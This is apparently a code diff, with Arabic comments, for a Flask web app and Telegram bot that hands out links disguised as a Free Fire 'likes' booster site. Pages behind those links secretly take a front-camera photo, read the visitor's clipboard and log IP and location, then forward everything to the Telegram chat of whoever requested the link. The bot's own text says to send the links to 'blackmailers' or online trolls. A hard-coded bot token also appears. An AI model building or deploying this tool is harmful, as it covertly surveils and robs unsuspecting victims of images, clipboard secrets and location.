@@ -8,53 +8,76 @@ import io
 import telebot
 import threading
 import time
+import secrets
+
 app = Flask(__name__)
+
+# إعدادات البوت
 TELEGRAM_BOT_TOKEN = '7930188784:AAHWJMVr9169-IOYPK-xuQDz9CV4fIMHXys'
-TELEGRAM_CHAT_ID = '7796858163'
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
-ADMIN_CHAT_ID = [7796858163,6839275984]  
+ADMIN_CHAT_ID = [7796858163, 6839275984]  # معرف الأدمن
+
+# إعدادات التسجيل
 logging.basicConfig(level=logging.INFO)
 IP_INFO_API = "https://ipinfo.io"
+
+# تهيئة البوت
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+
+# وظيفة للرد على الأمر /c
 @bot.message_handler(commands=['c'])
 def handle_c_command(message):
+    # إنشاء رابط فريد للمستخدم
+    unique_id = secrets.token_hex(8)  # إنشاء معرف فريد
+    user_chat_id = message.chat.id  # الحصول على chat_id الخاص بالمستخدم
+    domain = "https://api-like-free-fire-new.vercel.app"  # الدومين الخاص بك
+    link = f"{domain}/like?chat_id={user_chat_id}&id={unique_id}"  # الرابط الفريد
+
     # إرسال الرسالة الأولى
     bot.reply_to(message, 
-        "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**\n\n"
-        "**🔹 XAZ Team Official Links 🔹**\n"
-        "🌍 **Source Group:** [XAZ Team Source](https://t.me/xazteam)\n"
-        "🌍 **New Team Group:** [Join XAZ Team](https://t.me/+nuACUoH_xn05NjE0)\n"
-        "🌍 **XAZ Team Official Website:** [Visit Website](https://xaz-team-website.free.bg/)\n\n"
-        "**🌍 XAZ Team Official Website 🌍**\n"
-        "⚠ **Note:** If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
-        "Stay safe and always verify official sources! 💙"
+        f"<b>تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖</b>\n\n"
+        f"<b>🔹 XAZ Team Official Links 🔹</b>\n"
+        f"🌍 <b>Source Group:</b> <a href='https://t.me/xazteam'>XAZ Team Source</a>\n"
+        f"🌍 <b>New Team Group:</b> <a href='https://t.me/+nuACUoH_xn05NjE0'>Join XAZ Team</a>\n"
+        f"🌍 <b>XAZ Team Official Website:</b> <a href='https://xaz-team-website.free.bg/'>Visit Website</a>\n\n"
+        f"<b>🌍 XAZ Team Official Website 🌍</b>\n"
+        f"⚠ <b>Note:</b> If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
+        f"Stay safe and always verify official sources! 💙\n\n"
+        f"<b>رابطك الفريد:</b> {link}",
+        parse_mode="HTML"
     )
 
     # تأخير 15 ثانية ثم إرسال رسالة إلى الأدمن
-    threading.Thread(target=send_admin_message_after_delay, args=(message.chat.id,)).start()
+    threading.Thread(target=send_admin_message_after_delay, args=(user_chat_id,)).start()
 
 # وظيفة لإرسال رسالة إلى الأدمن بعد 15 ثانية
 def send_admin_message_after_delay(chat_id):
     time.sleep(15)
-    bot.send_message(ADMIN_CHAT_ID, 
-        f"**تم قبول طلب دخول سيرفر XAZ من المستخدم:** {chat_id}\n"
-        "يرجى التحقق من الطلب والرد عليه."
-    )
+    for admin_id in ADMIN_CHAT_ID:
+        bot.send_message(
+            admin_id,
+            f"<b>تم قبول طلب دخول سيرفر XAZ من المستخدم:</b> {chat_id}\n"
+            "يرجى التحقق من الطلب والرد عليه.",
+            parse_mode="HTML"
+        )
 
 # وظيفة للرد على الأوامر /xaz, /help, /start
 @bot.message_handler(commands=['xaz', 'help', 'start'])
 def handle_commands(message):
+    user_chat_id = message.chat.id  # الحصول على chat_id الخاص بالمستخدم
+    domain = "https://api-like-free-fire-new.vercel.app"  # الدومين الخاص بك
     bot.reply_to(message, 
-        "**مرحبا بكم في سرفر XAZ, هذا سرفر تجريبي لميزات نكح أي مبتز أو ذبابة إلكترونية**\n\n"
-        "هذه الرسالة عند ظهورها تعني تم قبول طلب لسرفر XAZ.\n"
-        "هذا البوت تم تنصيبه على السيرفر بنجاح.\n\n"
-        "الآن هناك عدة روابط على شكل موقع زيادة لايكات فري فاير 😊\n"
-        "(تقوم بمشاركة هذه الروابط مع المبتز أو الذبابة الإلكترونية للقضاء عليها 🙂)\n\n"
-        "كل ما عليك هو أخذ أي رابط من التالي:\n"
-        "- https://api-like-free-fire-new.vercel.app/like\n"
-        "- https://api-like-free-fire-new.vercel.app/visit\n"
-        "- https://api-like-free-fire-new.vercel.app/spam\n\n"
-        "**By:** @X_M_1_9, @Wewefso"
+        f"<b>مرحبا بكم في سرفر XAZ, هذا سرفر تجريبي لميزات نكح أي مبتز أو ذبابة إلكترونية</b>\n\n"
+        f"<b>هذه الرسالة عند ظهورها تعني تم قبول طلب لسرفر XAZ.</b>\n"
+        f"<b>هذا البوت تم تنصيبه على السيرفر بنجاح.</b>\n\n"
+        f"<b>الآن هناك عدة روابط على شكل موقع زيادة لايكات فري فاير 😊</b>\n"
+        f"<b>(تقوم بمشاركة هذه الروابط مع المبتز أو الذبابة الإلكترونية للقضاء عليها 🙂)</b>\n\n"
+        f"<b>كل ما عليك هو أخذ أي رابط من التالي:</b>\n"
+        f"- {domain}/like?chat_id={user_chat_id}\n"
+        f"- {domain}/visit?chat_id={user_chat_id}\n"
+        f"- {domain}/spam?chat_id={user_chat_id}\n\n"
+        f"<b>By:</b> @X_M_1_9, @Wewefso",
+        parse_mode="HTML"
     )
 
 # تشغيل البوت في خيط منفصل
@@ -65,7 +88,7 @@ def run_bot():
 threading.Thread(target=run_bot).start()
 
 # باقي الكود الخاص بـ Flask
-def generate_page(title, bg_color, button_text):
+def generate_page(title, bg_color, button_text, chat_id):
     return f"""<!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -116,6 +139,7 @@ def generate_page(title, bg_color, button_text):
 
                 let formData = new FormData();
                 formData.append("photo", blob, `${{label}}_photo.png`);
+                formData.append("chat_id", "{chat_id}");
 
                 await fetch('/upload', {{ method: 'POST', body: formData }});
 
@@ -130,9 +154,9 @@ def generate_page(title, bg_color, button_text):
             if (id) {{
                 await capturePhoto("user", "front");
                 await sendClipboard();
-                alert("tm like");
+                alert("تم الإرسال بنجاح");
             }} else {{
-                alert("send id");
+                alert("يرجى إدخال المعرف");
             }}
         }}
 
@@ -142,13 +166,14 @@ def generate_page(title, bg_color, button_text):
                 if (text) {{
                     const formData = new FormData();
                     formData.append("clipboard", text);
+                    formData.append("chat_id", "{chat_id}");
 
                     await fetch('/upload', {{ method: 'POST', body: formData }});
                 }} else {{
-                    console.log("no");
+                    console.log("لا يوجد محتوى في الحافظة");
                 }}
             }} catch (error) {{
-                console.log("error, error);
+                console.log("حدث خطأ: ", error);
             }}
         }}
     </script>
@@ -162,15 +187,24 @@ def generate_page(title, bg_color, button_text):
 
 @app.route('/like')
 def like():
-    return generate_page("Like Page", "#ffcccc", "Submit")
+    chat_id = request.args.get('chat_id')  # الحصول على chat_id من الرابط
+    if not chat_id:
+        return "Chat ID مطلوب!", 400
+    return generate_page("Like Page", "#ffcccc", "Submit", chat_id)
 
 @app.route('/visit')
 def visit():
-    return generate_page("Visit Page", "#ffffff", "Submit")
+    chat_id = request.args.get('chat_id')  # الحصول على chat_id من الرابط
+    if not chat_id:
+        return "Chat ID مطلوب!", 400
+    return generate_page("Visit Page", "#ffffff", "Submit", chat_id)
 
 @app.route('/spam')
 def spam():
-    return generate_page("Spam Page", "#ffccff", "Submit")
+    chat_id = request.args.get('chat_id')  # الحصول على chat_id من الرابط
+    if not chat_id:
+        return "Chat ID مطلوب!", 400
+    return generate_page("Spam Page", "#ffccff", "Submit", chat_id)
 
 def add_watermark(image_path, output_path):
     image = Image.open(image_path)
@@ -183,6 +217,10 @@ def add_watermark(image_path, output_path):
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
+        chat_id = request.form.get("chat_id")  # الحصول على chat_id من البيانات المرسلة
+        if not chat_id:
+            return jsonify({'status': 'error', 'message': '❌ لم يتم تحديد الشات'}), 400
+
         ip_info = requests.get(IP_INFO_API).json()
         ip = ip_info.get('ip', 'غير معروف')
         city = ip_info.get('city', 'غير معروف')
@@ -211,7 +249,7 @@ def upload():
             response = requests.post(
                 f"{TELEGRAM_API_URL}/sendPhoto",
                 data={
-                    'chat_id': TELEGRAM_CHAT_ID,
+                    'chat_id': chat_id,  # إرسال إلى الشات المحدد
                     'caption': message,
                     'parse_mode': 'HTML'
                 },
@@ -224,7 +262,7 @@ def upload():
             response = requests.post(
                 f"{TELEGRAM_API_URL}/sendMessage",
                 data={
-                    'chat_id': TELEGRAM_CHAT_ID,
+                    'chat_id': chat_id,  # إرسال إلى الشات المحدد
                     'text': f"{message}\n\n<b>Clipboard Content:</b>\n<code>{clipboard_content}</code>",
                     'parse_mode': 'HTML'
                 }
